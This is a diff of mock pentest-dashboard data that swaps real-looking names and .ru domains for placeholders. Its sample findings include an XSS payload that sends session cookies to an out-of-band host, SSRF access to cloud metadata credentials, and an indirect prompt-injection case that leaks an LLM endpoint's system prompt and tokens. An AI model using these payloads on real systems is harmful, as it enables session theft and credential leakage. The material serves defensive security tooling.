@@ -125,56 +125,56 @@ export interface TensolData {
 }
 
 export const TENSOL_DATA: TensolData = {
-  user: { name: 'Alex Kovalev', email: 'alex.k@acme.com', tenant: 'acme-prod', role: 'security_lead' },
+  user: { name: 'Alex Rivera', email: 'alex.r@acme.example', tenant: 'acme-prod', role: 'security_lead' },
 
   projects: [
-    { id: 'p1', name: 'core-banking-prod',     owner: 'A. Kovalev',  targets: 14, openAssessments: 2, confirmed: 11, last: '2026-05-04 14:22' },
-    { id: 'p2', name: 'broker-portal-staging', owner: 'M. Petrova',  targets: 7,  openAssessments: 1, confirmed: 4,  last: '2026-05-04 09:18' },
-    { id: 'p3', name: 'api-gateway-public',    owner: 'A. Kovalev',  targets: 22, openAssessments: 1, confirmed: 9,  last: '2026-05-03 18:01' },
-    { id: 'p4', name: 'kyc-vendor-enclave',    owner: 'D. Smirnov',  targets: 5,  openAssessments: 0, confirmed: 2,  last: '2026-04-29 11:40' },
-    { id: 'p5', name: 'mobile-backend-v3',     owner: 'M. Petrova',  targets: 9,  openAssessments: 0, confirmed: 0,  last: '2026-04-22 16:55' },
+    { id: 'p1', name: 'core-banking-prod',     owner: 'A. Rivera',  targets: 14, openAssessments: 2, confirmed: 11, last: '2026-05-04 14:22' },
+    { id: 'p2', name: 'broker-portal-staging', owner: 'M. Chen',  targets: 7,  openAssessments: 1, confirmed: 4,  last: '2026-05-04 09:18' },
+    { id: 'p3', name: 'api-gateway-public',    owner: 'A. Rivera',  targets: 22, openAssessments: 1, confirmed: 9,  last: '2026-05-03 18:01' },
+    { id: 'p4', name: 'kyc-vendor-enclave',    owner: 'D. Patel',  targets: 5,  openAssessments: 0, confirmed: 2,  last: '2026-04-29 11:40' },
+    { id: 'p5', name: 'mobile-backend-v3',     owner: 'M. Chen',  targets: 9,  openAssessments: 0, confirmed: 0,  last: '2026-04-22 16:55' },
   ],
 
   targets: [
-    { id: 't1',  type: 'web',           ident: 'app.acme-bank.ru',                ownership: 'verified', method: 'dns',    last: '2026-05-04 12:01', findings: 7, project: 'p1' },
-    { id: 't2',  type: 'web',           ident: 'admin.acme-bank.ru',              ownership: 'verified', method: 'header', last: '2026-05-04 11:50', findings: 4, project: 'p1' },
-    { id: 't3',  type: 'api',           ident: 'api.acme-bank.ru/v3/openapi.json',ownership: 'verified', method: 'file',   last: '2026-05-04 11:42', findings: 0, project: 'p1' },
+    { id: 't1',  type: 'web',           ident: 'app.acme-bank.example',                ownership: 'verified', method: 'dns',    last: '2026-05-04 12:01', findings: 7, project: 'p1' },
+    { id: 't2',  type: 'web',           ident: 'admin.acme-bank.example',              ownership: 'verified', method: 'header', last: '2026-05-04 11:50', findings: 4, project: 'p1' },
+    { id: 't3',  type: 'api',           ident: 'api.acme-bank.example/v3/openapi.json',ownership: 'verified', method: 'file',   last: '2026-05-04 11:42', findings: 0, project: 'p1' },
     { id: 't4',  type: 'host',          ident: '10.42.18.101',                    ownership: 'verified', method: 'cloud',  last: '2026-05-03 22:19', findings: 0, project: 'p1' },
     { id: 't5',  type: 'cloud',         ident: 'gcp-project/sthrip-scanners/prod-net',       ownership: 'verified', method: 'cloud',  last: '2026-05-03 20:08', findings: 0, project: 'p1' },
-    { id: 't6',  type: 'web',           ident: 'broker-staging.acme-bank.ru',     ownership: 'verified', method: 'dns',    last: '2026-05-04 08:51', findings: 4, project: 'p2' },
-    { id: 't7',  type: 'web',           ident: 'beta.broker-staging.acme-bank.ru',ownership: 'pending',  method: 'dns',    last: '—',                findings: 0, project: 'p2' },
+    { id: 't6',  type: 'web',           ident: 'broker-staging.acme-bank.example',     ownership: 'verified', method: 'dns',    last: '2026-05-04 08:51', findings: 4, project: 'p2' },
+    { id: 't7',  type: 'web',           ident: 'beta.broker-staging.acme-bank.example',ownership: 'pending',  method: 'dns',    last: '—',                findings: 0, project: 'p2' },
     { id: 't8',  type: 'repository',    ident: 'github.com/acme/broker-portal',   ownership: 'verified', method: 'header', last: '2026-05-02 18:14', findings: 0, project: 'p2' },
-    { id: 't9',  type: 'web',           ident: 'gw.acme.ru',                      ownership: 'verified', method: 'header', last: '2026-05-03 17:55', findings: 9, project: 'p3' },
-    { id: 't10', type: 'api',           ident: 'gw.acme.ru/v1/openapi.json',      ownership: 'verified', method: 'file',   last: '2026-05-03 17:30', findings: 0, project: 'p3' },
+    { id: 't9',  type: 'web',           ident: 'gw.acme.example',                      ownership: 'verified', method: 'header', last: '2026-05-03 17:55', findings: 9, project: 'p3' },
+    { id: 't10', type: 'api',           ident: 'gw.acme.example/v1/openapi.json',      ownership: 'verified', method: 'file',   last: '2026-05-03 17:30', findings: 0, project: 'p3' },
     { id: 't11', type: 'host',          ident: '10.42.71.5/29',                   ownership: 'verified', method: 'cloud',  last: '2026-05-03 17:15', findings: 0, project: 'p3' },
     { id: 't12', type: 'web',           ident: 'kyc.vendor.com',                  ownership: 'failed',   method: 'email',  last: '2026-04-30 10:00', findings: 0, project: 'p4' },
   ],
 
   assessments: [
-    { id: 'a1', project: 'p1', name: 'Q2-prod-pentest-01', status: 'running',           phase: 'exploit',  startedAt: '2026-05-04 09:00', operator: 'A. Kovalev', findings: { confirmed: 3, candidate: 7 }, progress: 0.62 },
-    { id: 'a2', project: 'p3', name: 'gw-edge-revalidation', status: 'running',         phase: 'recon',    startedAt: '2026-05-04 13:42', operator: 'M. Petrova', findings: { confirmed: 0, candidate: 2 }, progress: 0.18 },
-    { id: 'a3', project: 'p2', name: 'broker-staging-baseline', status: 'awaiting_approval', phase: '—',   startedAt: '—',                operator: 'M. Petrova', findings: { confirmed: 0, candidate: 0 }, progress: 0 },
-    { id: 'a4', project: 'p1', name: 'admin-RBAC-deepdive', status: 'completed',        phase: 'report',   startedAt: '2026-05-02 09:00', operator: 'A. Kovalev', findings: { confirmed: 5, candidate: 12 }, progress: 1 },
-    { id: 'a5', project: 'p1', name: 'pre-release-smoke',   status: 'cancelled',        phase: 'recon',    startedAt: '2026-04-29 14:30', operator: 'D. Smirnov', findings: { confirmed: 0, candidate: 1 }, progress: 0.08 },
+    { id: 'a1', project: 'p1', name: 'Q2-prod-pentest-01', status: 'running',           phase: 'exploit',  startedAt: '2026-05-04 09:00', operator: 'A. Rivera', findings: { confirmed: 3, candidate: 7 }, progress: 0.62 },
+    { id: 'a2', project: 'p3', name: 'gw-edge-revalidation', status: 'running',         phase: 'recon',    startedAt: '2026-05-04 13:42', operator: 'M. Chen', findings: { confirmed: 0, candidate: 2 }, progress: 0.18 },
+    { id: 'a3', project: 'p2', name: 'broker-staging-baseline', status: 'awaiting_approval', phase: '—',   startedAt: '—',                operator: 'M. Chen', findings: { confirmed: 0, candidate: 0 }, progress: 0 },
+    { id: 'a4', project: 'p1', name: 'admin-RBAC-deepdive', status: 'completed',        phase: 'report',   startedAt: '2026-05-02 09:00', operator: 'A. Rivera', findings: { confirmed: 5, candidate: 12 }, progress: 1 },
+    { id: 'a5', project: 'p1', name: 'pre-release-smoke',   status: 'cancelled',        phase: 'recon',    startedAt: '2026-04-29 14:30', operator: 'D. Patel', findings: { confirmed: 0, candidate: 1 }, progress: 0.08 },
   ],
 
   findings: [
     {
       id: 'f1', title: 'Reflected XSS in /search via q parameter',
       sev: 'high', conf: 'verified', status: 'confirmed',
-      asset: 'app.acme-bank.ru', endpoint: 'GET /search?q=',
+      asset: 'app.acme-bank.example', endpoint: 'GET /search?q=',
       assessment: 'a1', source: 'browser-recon → validator.xss',
       foundAt: '2026-05-04 11:14',
       impact: 'Attacker-controlled HTML executes in the victim session. CSP allows inline; cookie SameSite=Lax not enforced for subdomain. Account-takeover demonstrated via session cookie exfiltration to OOB sink.',
       repro: [
-        'GET https://app.acme-bank.ru/search?q=%3Csvg%2Fonload%3Dfetch(`https://oob.sthrip.dev/c/8f2c?c=`%2Bdocument.cookie)%3E',
+        'GET https://app.acme-bank.example/search?q=%3Csvg%2Fonload%3Dfetch(`https://oob.sthrip.dev/c/8f2c?c=`%2Bdocument.cookie)%3E',
         'Server reflects q into <h1> without escaping (response.body line 412).',
         'Browser executes payload. OOB callback received in 412ms with full session cookie.',
       ],
       validatorLog: [
         '[ok]   validator.xss · seed=42 · 2026-05-04 11:14:02 UTC',
         '[ok]   playwright.context.new · headless=true · profile=clean',
-        '[ok]   nav https://app.acme-bank.ru/search?q=<payload> · 200 OK · 441ms',
+        '[ok]   nav https://app.acme-bank.example/search?q=<payload> · 200 OK · 441ms',
         '[ok]   evidence.screenshot ev_8f2c_001.png · sha256:9a4b…',
         '[ok]   oob.callback received · token=8f2c · soft=match · hard=match',
         '[ok]   replay.deterministic · run 2/2 ok',
@@ -184,14 +184,14 @@ export const TENSOL_DATA: TensolData = {
       mappings: { mitre: ['T1059.007 · Command and Scripting Interpreter: JavaScript', 'T1539 · Steal Web Session Cookie'], nistCsf: ['PR.DS-2', 'DE.CM-1'], atlas: [], d3fend: ['D3-CSPP · Content Security Policy Hardening'], aiRmf: [] },
       remediation: 'Output-encode all reflected query parameters at the template layer. Reject `<`/`>` in the q param at the WAF. Tighten CSP to remove `unsafe-inline`. Set SameSite=Strict on session cookies for subdomain scope.',
       comments: [
-        { who: 'A. Kovalev',  when: '2026-05-04 11:20', text: 'Triaged. Owner: web-platform team.' },
-        { who: 'M. Petrova', when: '2026-05-04 11:42', text: 'Validator replay clean across 2 runs. Confirming.' },
+        { who: 'A. Rivera',  when: '2026-05-04 11:20', text: 'Triaged. Owner: web-platform team.' },
+        { who: 'M. Chen', when: '2026-05-04 11:42', text: 'Validator replay clean across 2 runs. Confirming.' },
       ],
     },
     {
       id: 'f2', title: 'IDOR on /api/v3/accounts/{id}/statement',
       sev: 'critical', conf: 'verified', status: 'confirmed',
-      asset: 'api.acme-bank.ru', endpoint: 'GET /api/v3/accounts/{id}/statement',
+      asset: 'api.acme-bank.example', endpoint: 'GET /api/v3/accounts/{id}/statement',
       assessment: 'a1', source: 'openapi-driven → validator.authz',
       foundAt: '2026-05-04 10:51',
       impact: 'Any authenticated user can request any account\'s monthly statement by incrementing the id. PII disclosure across tenants. Validator confirmed by issuing two requests with different victim IDs from a single low-privileged session.',
@@ -212,13 +212,13 @@ export const TENSOL_DATA: TensolData = {
       mappings: { mitre: ['T1190 · Exploit Public-Facing Application', 'T1213 · Data from Information Repositories'], nistCsf: ['PR.AC-4', 'PR.DS-5'], atlas: [], d3fend: ['D3-AZET · Authorization Event Thresholding'], aiRmf: [] },
       remediation: 'Enforce per-resource authorization at the controller, not at the route. Add an automated policy test that checks 403 for cross-tenant id sweep.',
       comments: [
-        { who: 'A. Kovalev', when: '2026-05-04 10:55', text: 'Critical. Filed P0 incident in Linear ACME-9921.' },
+        { who: 'A. Rivera', when: '2026-05-04 10:55', text: 'Critical. Filed P0 incident in Linear ACME-9921.' },
       ],
     },
     {
       id: 'f3', title: 'SSRF in /api/v3/avatar/proxy via url parameter',
       sev: 'high', conf: 'verified', status: 'confirmed',
-      asset: 'api.acme-bank.ru', endpoint: 'POST /api/v3/avatar/proxy',
+      asset: 'api.acme-bank.example', endpoint: 'POST /api/v3/avatar/proxy',
       assessment: 'a1', source: 'browser-recon → validator.ssrf',
       foundAt: '2026-05-04 12:03',
       impact: 'Server-side fetch with attacker-controlled URL. Confirmed access to AWS-style metadata at 169.254.169.254 returning IAM credentials. Validator confirmed by reading the metadata response over OOB.',
@@ -239,7 +239,7 @@ export const TENSOL_DATA: TensolData = {
     {
       id: 'f4', title: 'CRLF injection in Set-Cookie via tracking header',
       sev: 'medium', conf: 'verified', status: 'confirmed',
-      asset: 'app.acme-bank.ru', endpoint: 'GET /track?t=',
+      asset: 'app.acme-bank.example', endpoint: 'GET /track?t=',
       assessment: 'a1', source: 'browser-recon → validator.crlf',
       foundAt: '2026-05-04 13:10',
       impact: 'Reflected unfiltered CR/LF allows injection of additional response headers. Demonstrated cookie-overwrite for unrelated subpath.',
@@ -257,11 +257,11 @@ export const TENSOL_DATA: TensolData = {
     {
       id: 'f5', title: 'TLS 1.0 still negotiable on legacy LB endpoint',
       sev: 'low', conf: 'verified', status: 'confirmed',
-      asset: 'gw.acme.ru', endpoint: 'TLS 0/0/443',
+      asset: 'gw.acme.example', endpoint: 'TLS 0/0/443',
       assessment: 'a4', source: 'tls-probe → validator.tls',
       foundAt: '2026-05-02 10:18',
       impact: 'TLS 1.0 negotiation still succeeds against the legacy LB listener. Modern clients are not affected, but compliance posture is degraded.',
-      repro: ['openssl s_client -tls1 -connect gw.acme.ru:443 → handshake succeeds.'],
+      repro: ['openssl s_client -tls1 -connect gw.acme.example:443 → handshake succeeds.'],
       validatorLog: ['[ok]   validator.tls · 2026-05-02 10:18 · TLS1.0 reachable'],
       attack: [], mappings: { mitre: [], nistCsf: ['PR.DS-2'], atlas: [], d3fend: [], aiRmf: [] },
       remediation: 'Disable TLS<1.2 on the LB listener, enforce TLS1.3 minimum.',
@@ -270,7 +270,7 @@ export const TENSOL_DATA: TensolData = {
     {
       id: 'f6', title: 'Open redirect on /auth/callback ?next=',
       sev: 'medium', conf: 'unverified', status: 'candidate',
-      asset: 'broker-staging.acme-bank.ru', endpoint: 'GET /auth/callback',
+      asset: 'broker-staging.acme-bank.example', endpoint: 'GET /auth/callback',
       assessment: 'a3', source: 'browser-recon',
       foundAt: '2026-05-04 09:42',
       impact: '(candidate) Attacker can craft a callback URL that redirects to an attacker-controlled host. Awaiting validator replay.',
@@ -283,7 +283,7 @@ export const TENSOL_DATA: TensolData = {
     {
       id: 'f7', title: 'Prompt-injection bypass on /api/v1/llm/summarize',
       sev: 'high', conf: 'verified', status: 'confirmed',
-      asset: 'gw.acme.ru', endpoint: 'POST /api/v1/llm/summarize',
+      asset: 'gw.acme.example', endpoint: 'POST /api/v1/llm/summarize',
       assessment: 'a4', source: 'llm-probe → validator.promptinject',
       foundAt: '2026-05-02 14:18',
       impact: 'Indirect prompt injection in user-provided document text causes the LLM-summary endpoint to leak system-prompt and downstream tool tokens. Replay confirmed across 5/5 seeds.',
@@ -316,13 +316,13 @@ export const TENSOL_DATA: TensolData = {
   ],
 
   approvals: [
-    { id: 'h1', kind: 'category', target: 'app.acme-bank.ru', detail: 'enable credential-dump simulation', requestedBy: 'engine', when: '13:45:02', justify: 'tool.credential_dump requires target authorization. Operator must declare.' },
-    { id: 'h2', kind: 'window',   target: 'broker-staging.acme-bank.ru', detail: 'extend testing window by 2h', requestedBy: 'M. Petrova', when: '14:01:50', justify: 'recon completed, validator queue still backed up.' },
+    { id: 'h1', kind: 'category', target: 'app.acme-bank.example', detail: 'enable credential-dump simulation', requestedBy: 'engine', when: '13:45:02', justify: 'tool.credential_dump requires target authorization. Operator must declare.' },
+    { id: 'h2', kind: 'window',   target: 'broker-staging.acme-bank.example', detail: 'extend testing window by 2h', requestedBy: 'M. Chen', when: '14:01:50', justify: 'recon completed, validator queue still backed up.' },
   ],
 
   reports: [
     { id: 'r1', project: 'core-banking-prod',     assessment: 'admin-RBAC-deepdive', type: 'tech', date: '2026-05-02 18:30', status: 'delivered',  template: 'default' },
-    { id: 'r2', project: 'core-banking-prod',     assessment: 'admin-RBAC-deepdive', type: 'comp', date: '2026-05-02 18:35', status: 'delivered',  template: 'gost' },
+    { id: 'r2', project: 'core-banking-prod',     assessment: 'admin-RBAC-deepdive', type: 'comp', date: '2026-05-02 18:35', status: 'delivered',  template: 'soc2' },
     { id: 'r3', project: 'broker-portal-staging', assessment: 'broker-q1-baseline',  type: 'exec', date: '2026-04-12 10:00', status: 'delivered',  template: 'default' },
     { id: 'r4', project: 'core-banking-prod',     assessment: 'Q2-prod-pentest-01',  type: 'tech', date: '2026-05-04 14:00', status: 'draft',      template: 'default' },
   ],
